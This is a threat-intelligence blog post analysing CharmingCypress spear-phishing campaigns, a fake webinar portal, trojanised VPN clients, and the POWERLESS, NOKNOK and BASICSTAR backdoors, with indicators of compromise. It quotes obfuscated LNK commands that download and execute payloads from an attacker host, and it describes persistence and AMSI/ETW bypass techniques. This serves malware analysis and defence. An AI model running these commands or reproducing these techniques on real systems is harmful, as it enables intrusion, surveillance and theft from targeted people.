by Ankur Saini, Callum Roxan, Charlie Gardner, Damien Cash
Through its managed security services offerings, Volexity routinely identifies spear-phishing campaigns targeting its
customers. One persistent threat actor, whose campaigns Volexity frequently observes, is the Iranian-origin threat
actor CharmingCypress (aka Charming Kitten, APT42, TA453). Volexity assesses that CharmingCypress is tasked
with collecting political intelligence against foreign targets, particularly focusing on think tanks, NGOs, and journalists.
In their phishing campaigns, CharmingCypress often employs unusual social-engineering tactics, such as engaging
targets in prolonged conversations over email before sending links to malicious content. In a particularly notable
spear-phishing campaign observed by Volexity, CharmingCypress went so far as to craft an entirely fake webinar
platform to use as part of the lure. CharmingCypress controlled access to this platform, requiring targets to install
malware-laden VPN applications prior to granting access.
Note: Some content in this blog was recently discussed in Microsoft’s report, New TTPs observed in Mint Sandstorm
campaign targeting high-profile individuals at universities and research orgs.
Malware Families Associated with CharmingCypress
This blog post serves as a public reference regarding tools Volexity has observed in use by CharmingCypress
throughout 2023 and into early 2024 including details on techniques the threat actor has used to distribute them. The
following malware families are discussed in this post:
POWERSTAR
POWERLESS
NOKNOK
BASICSTAR
EYEGLASS
2/14
In June 2023, Volexity published a post about POWERSTAR. And while CharmingCypress has previously distributed
POWERSTAR (aka GorjolEcho) and NOKNOK within the same campaign, the use of POWERLESS in a recently
identified campaign is a new observation. Furthermore, BASICSTAR appears to be a new Visual Basic malware that
has limited functional overlap with POWERSTAR.
Malware Distribution Techniques
Spear Phishing
Throughout 2023, Volexity observed a wide range of spear-phishing activity conducted by CharmingCypress. This
activity included spoofing individuals from different organizations, including the use of personas tied to media
organizations and research institutions. In September and October 2023, CharmingCypress engaged in a series of
spear-phishing attacks in which they masqueraded as the Rasanah International Institute for Iranian Studies (IIIS).
CharmingCypress registered multiple, typo-squatted domains for use in these attacks that are similar to the
organization’s actual domain, rasanah-iiis[.]org.
The image below shows an example of a spear phish sent by CharmingCypress, in which the threat actor contacted a
policy expert pretending to be an employee of the Rasanah Institute. The email invites the target to join a fake
webinar.
This email demonstrates the following features:
An attempt to engage the target in a conversation, rather than immediately prompting them to open a malicious
link or download malware
Impersonation of a real organization likely to be known by the target in order to construct a viable reason for the
contact
3/14
The use of WhatsApp and Signal phone numbers, which are controlled by CharmingCypress and are offered as
alternative methods of contacting the threat actor
Other spear-phish attempts by CharmingCypress in 2023 have involved one or more of the following:
URLs that start a redirection chain, culminating in the download of a RAR archive containing malicious shortcut
(LNK) files
Use of compromised webmail accounts belonging to real contacts of the target
Use of multiple threat-actor controlled email accounts within the same phishing chain (which Proofpoint
previously described as Multi-Persona Impersonation)
RAR + LNK Combo
In 2023 CharmingCypress often used RAR archives containing LNK files to deliver malware during spear-phishing
campaigns. The infection chain from a recent campaign conducted by CharmingCypress is shown below.
After initial contact with the target was established and matured, an OnRender URL (hxxps://cloud-document-
edit.onrender[.]com/page/jujbMKB[snipped]TpCNvV) was shared with the target. This URL redirected to a
password-protected RAR file hosted on Supabase
(hxxps://wulpfsrqupnuqorhexiw.supabase[.]co/storage/v1/object/public/StarPj/Items%20Shared.r
The password for this RAR was shared in a subsequent email.
The RAR file contained two LNK files:

The names of these files were copied from recent articles published by Atlantic Council in order to appeal to the
victim. Each LNK has its own unique infection workflow. However, both will ultimately open a remotely-hosted decoy
document and download a malware component. Both LNK files make use of string-replacement to obfuscate
commands.
4/14
The following defanged command, embedded in The global consequences of the Israel-Hamas war -
Shortcut.lnk, downloads and executes BASICSTAR, which is discussed in further detail later in this blog post.
/c set c=cu7rl --s7sl-no-rev7oke -s -d "id=VzXdED&Prog=2_Mal_vbs.txt&WH=The-

& call %c:7=% & set b=sta7rt "" "%temp%\down.v7bs" & call %b:7=%
The following defanged command, embedded in US strategy in the Middle East is coming into
focus - Shortcut.lnk, downloads and executes KORKULOADER.
/c set fg=powershetsrll.exe -w 1 "$y=(wgetsrt -Urtsri 
httsrtps://wulpfsrqupnuqorhexiw.supabase[.]co/storage/v1/object/public/StarPj/AUN.txt 
-UseBatsrsicParsing).Cotsrntent; &(gctsrm *ketsr-e*)$y"; & call %fg:tsr=%
KORKULOADER is a very simple PowerShell downloader script that could not be used to obtain additional payloads
at the time of investigation.
This infection chain was partially discussed in this recent Microsoft blog post.
Malware-laden VPN Applications
Another recent CharmingCypress spear-phishing campaign was developed on a technique reported by Proofpoint in
July 2023 using a malware-laden VPN application to deploy malware. A high-level overview of the overall infection
chain is shown below.
Emails containing a link to a fake webinar platform, and credentials to enable access to it, were distributed to a small
number of targeted individuals. The platform was hosted on the following subdomains:
rasaaneh-iiis[.]org
rasaanah-iiis[.]org
Volexity identified emails sent using the following domains, which all mimic the legitimate rasanah-iiis[.]org domain:
rasaneh-iiis[.]org
5/14
rasaanah-iiis[.]org
rasaaneh-iiis[.]org
When users attempted to access the portal, it would check the supplied credentials. If the credentials were correct, it
would then check the IP address used to access the portal. Only users running the attacker’s VPN client would
successfully authenticate. If the IP address check failed, targets were prompted to download a VPN application, as
shown below.
Depending on the user’s operating system (determined via the user-agent used to request the page), different
applications would be served to the user. The resulting VPN client was a functional VPN client laden with malware.
Windows victims would be served an infection chain culminating in POWERLESS, while macOS victims would be
served an infection chain culminating in NOKNOK.
The Windows VPN application shown below establishes a connection to a CharmingCypress-controlled VPN
endpoint using the supplied credentials and an OpenVPN configuration file.
6/14
When connected to this VPN, outbound network requests to the portal are routed through the VPN server. The
macOS version achieves a similar VPN connection using the Apple utility networksetup to install a SOCKS proxy
to the Wi-Fi network service via the following command:
networksetup -setsocksfirewallproxy wi-fi $serveradd $portnum
These proxy parameters are parsed from an OVPN configuration file that contains a legitimate OpenVPN
configuration with additional non-standard fields containing data used by the client. The VPN server used was hosted
at 49.13.15[.]66 on UDP port 1194.
Attempting to log on to the portal while connected to the VPN successfully passes the IP address check and allows
access to the fake webinar portal.
Fake Webinar Portal
Inspecting the fake webinar portal shows the threat actor invested a significant level of effort. The portal includes the
logo of the impersonated organization within a full web portal interface that includes a series of tabs:
Dashboard tab – information from the Profile and Meeting tabs
Profile tab – details of the logged in user including their picture, name, title and bio
Meeting tab – details of the supposed meeting to which the target was originally invited, including speakers,
attendees and agenda

7/14
Storage tab – a variety of additional lure documents

Within the portal, profiles of 16 individuals were populated and associated with a specific webinar. Volexity reverse
engineered the malware-laden VPN application and identified 16 sets of MD5-hashed credentials with usernames.
When these credentials were cracked, they yielded plaintext usernames associated to individuals that Volexity
assesses with high confidence were targets of this campaign. All 16 individuals are experts in policy regarding the
Middle East.
Backdoors
POWERLESS
The backdoor deployed by the Windows variant of the malware-laden VPN application infection chain is called
POWERLESS. Previous reporting by Check Point on POWERLESS has linked the tool to EDUCATED MANTICORE,
a group Check Point assesses is “Iranian-aligned” and has “strong overlap with Phosphorous” (aka
CharmingCypress). POWERLESS is a PowerShell backdoor that contains a broad feature set including the following:
AES-encrypted command-and-control (C2) communication using a key passed down from the server
Download of additional executables for audio recording, browser information stealing, persistence, and
keylogging
Upload/download of files
Execution of files
Execution of shell commands
Screenshot capture
Telegram information theft
8/14
Update configuration of POWERLESS in memory, including modification of C2 address
These functions are largely the same as previously described by Check Point; however, the infection chain is slightly
different. The malware-laden VPN application writes a malicious binary, VPN.exe (file details below), to the default
OpenVPN directory and executes it. VPN.exe handles authentication via the supplied credentials and connection to
the VPN.
Name(s)
VPN.exe

It also downloads a base64-encoded blob of data from the C2, writes this to disk at C:\Users\Public\vconf, and
downloads a .NET binary named cfmon.exe (file details below). Persistence for cfmon.exe is achieved by adding a
Shell registry entry in registry key HKEY_CURRENT_USER\Software\Microsoft\Windows
NT\CurrentVersion\Winlogon (see T1547.004 for more information on this technique).

SHA1

When executed, cfmon.exe first patches the AmsiScanBuffer and EtwEventWrite API functions to bypass
them, replacing the initial function bytes. It then decrypts the AES-encrypted file vconf, retrieved by the previous
binary, yielding an obfuscated PowerShell script. This PowerShell script is executed in memory. After deobfuscating
this script, Volexity identified it as a new version of the POWERLESS malware. Details of the analyzed POWERLESS
sample are below.

The C2 address used by this sample of POWERLESS is defaultbluemarker[.]info. The following domains
could be trivially linked to this domain via shared SSL certificates and/or hosting infrastructure:
yellowparallelworld.ddns[.]net
beginningofgraylife.ddns[.]net
Volexity was able to obtain the three additional modules used by POWERLESS, which are further described below.
Browser Information Stealer
A browser information stealer module named blacksmith.exe can steal passwords, cookies and browser history.

Persistence
9/14
A persistence module downloads an executable, oqeifvb.exe, from the C2, writes this to
$env:windir\Temp\p\, and executes this via the Start-Process cmdlet. This module also passes the CLSID value
of the legitimate scheduled task MsCtfMonitor to oqeifvb.exe. POWERLESS then maintains persistence by
adding the HKCU\Environment\UserInitMprLogonScript registry entry with a value of oqeifvb.exe.
The purpose of oqeifvb.exe is to download another file, msedg.dll, and establish persistence for that file by
hijacking the COM handler for the MsCtfMonitor scheduled task using the CLSID retrieved earlier. Volexity was not
able to obtain the additional DLL and therefore assesses CharmingCypress likely limits deployment of this additional
stage to victims who have been manually approved to receive it.

NOKNOK
The backdoor deployed by the macOS version of the malware-laden VPN application infection chain is called
NOKNOK. This is downloaded by the VPN application and executed in memory. The download mechanism is
identical to that described by Proofpoint in their recent report. For example, the download URL for this bash script
shares the same /DMPR/[alphanumeric string] format.
CharmingCypress delivers NOKNOK as a string that has been base64 encoded five times. The resulting script is the
same as the previous version of the NOKNOK malware described by Proofpoint. The C2 used by this sample of
NOKNOK is decorous-super-blender[.]glitch[.]me.
BASICSTAR
The backdoor deployed by the RAR + LNK infection chain is a previously undocumented backdoor that Volexity track
as BASICSTAR. Details of the analyzed sample are below.
Name(s)
down.vbs
Size
13.3KB (13652 Bytes)
File Type

cdce8a3e723c376fc87be4d769d37092e6591972
BASICSTAR has the following functionality:
10/14
Collect the computer name, username and operating system from compromised device. This information is
reversed and base64 encoded before being passed to the C2 server.
Download a lure PDF from the C2 and open it.
Download the NirCmd command-line interface for execution of subsequent commands.
Enter a command loop, passing the collected information to the C2 and inspecting the returned result for a
command.
Execute commands via the NirCmd command-line interface.
Remotely execute commands relayed from the C2 (see table below).
Command
Function
kill
Delete update.vbs, a.vbs, and a.ps1, and then exit.
SetNewConfig
Set a new sleep timer for the command loop.
Module
Use ModuleTitle, ModuleName and Parameters to download a
file, and execute this via NirCmd.
Volexity was not able to obtain the additional modules used by BASICSTAR. Interestingly, the cleanup command
(kill) deletes three files that were not observed by Volexity (update.vbs, a.vbs, and a.ps1). These are likely
Visual Basic and PowerShell scripts downloaded in subsequent components of the attack. This capability is in line
with the same command in the POWERSTAR malware family.
Informations.vbs
The latest version of BASICSTAR observed by Volexity involved a Visual Basic script named Informations.vbs
(see below).
Name(s)
Informations.vbs
Size
21.6KB (22134 Bytes)
File Type

SHA1
25005352eff725afc93214cac14f0aa8e58ca409
Volexity assesses with high confidence that this script is a BASICSTAR module with an internal name of
Informations(sic). This module uses a variety of WMI queries to gather an extensive set of information about the
compromised machine, including the following:
Installed antivirus products
Installed software
Information regarding the machine BIOS, hardware, manufacturer details, and disks
Network adapters and configurations
The BASICSTAR sample involved in this infection chain was configured to use the Glitch domain prism-west-
candy[.]glitch[.]me as a C2.
Post-exploitation Activity & Investigation with Volexity Volcano
In one incident response case, Volexity gained some rare insight into additional tools CharmingCypress deploys if
they successfully compromise a device. Volexity used Volexity Volcano to analyze memory from the compromised
endpoint. Despite being protected by a popular endpoint detection and response (EDR) solution, Volcano quickly
showed several obvious signs of compromise.
One of Volcano’s automated IOCs (“Bad Powershell”) triggered on a script extracted from event logs. The log
contains references to some of the remote systems contacted by the script, including supabase[.]co. Furthermore,
it identifies the PID of the powershell.exe process (13524) that executed this script, as shown below.
11/14
This powershell.exe instance was still running, with its parent tree intact. Components of the LNK payload that
downloads BASICSTAR stood out in the command-line arguments, as shown below.
The process tree shows the interesting effect of string substitution. Both conhost.exe and cmd.exe contain
obfuscated content, but the decoded arguments to powershell.exe were preserved in memory:
powershell  -w 1 $pnt=(Get-Content" -Path C:\Users\
<redacted>\AppData\Roaming\Microsoft\documentLoger.txt);&(gcm "i*x)$pnt
Armed with knowledge of the documentLoger.txt path, Volexity reconstructed the entire contents from the
system’s file cache, as shown below.
12/14
Another Volcano IOC (“Shortcut Execution”) brought attention to one of the LNK files, Draft-LSE.pdf.lnk, used in
this attack. As shown below, this uses the icon from Microsoft Edge to trick end users.
Searching memory for the source of the LNK revealed an archive file named Draft-LSE (3).rar in the user’s
Downloads folder, along with a valuable set of timestamps to triage the activity, although the (3) in the file name
suggests this was not the first time the user downloaded this file. In the MFT-resident $DATA attribute, the
ZoneTransfer record showed where the file originated, as shown below.
13/14
After just a few minutes of reviewing Volcano’s IOC hits and searching for related artifacts in both memory and files
collected by Volexity Surge Collect Pro, Volexity analysts had nailed down the following evidence:
The initial infection vector and the website from where it was downloaded
How it persisted on the endpoint
The list of C2 hostnames
Timestamps when the activity took place
Many other IOCs to triage
Working folders used by the attacker on the compromised machine
Additional Tools Used by CharmingCypress
In the same investigation, Volexity identified additional tools used by CharmingCypress to facilitate data theft:
Nirsoft Chrome History Viewer
RATHOLE
SNAILPROXY
CommandCam
Command-line copies of WinRAR and 7-Zip
Volexity also identified a copy of EYEGLASS, the malware documented in a recent Microsoft post under the MediaPl
backdoor section. In the case investigated by Volexity, EYEGLASS had been set up as the default handler for the TIF
file extension. Encountering TIF files as part of the targeted user's day-to-day work would be unusual, and it is
unlikely the attacker would want to randomly display a TIF on an already-infected device. Based on available
evidence, Volexity assesses with high confidence that EYEGLASS was intended only as a backup C2 mechanism. In
this scenario, if CharmingCypress lost access to the victim machine, they would try sending the user a specially
crafted TIF file in order to regain access to the device if the user opened the file.
Conclusion
This blog post describes targeted campaigns that reveal a high level of effort CharmingCypress is willing to dedicate
to support their spear-phishing operations. This threat actor is highly committed to conducting surveillance on their
targets in order to determine how best to manipulate them and deploy malware. Additionally, few other threat actors
have consistently churned out as many campaigns as CharmingCypress, dedicating human operators to support their
ongoing efforts.
14/14
For those targeted by CharmingCypress, such as journalists, activists, academics, and policy experts, it is crucial to
understand that CharmingCypress is persistent. This threat actor is willing to modify their techniques on a regular
basis in order to maximize their chances of compromising specific targets.
For threat intelligence readers, this blog post firmly links NOKNOK and POWERLESS to recent CharmingCypress
spear-phishing activity and adds documentation regarding the BASICSTAR backdoor. This cluster has previously
used the POWERSTAR malware family during similar operations.
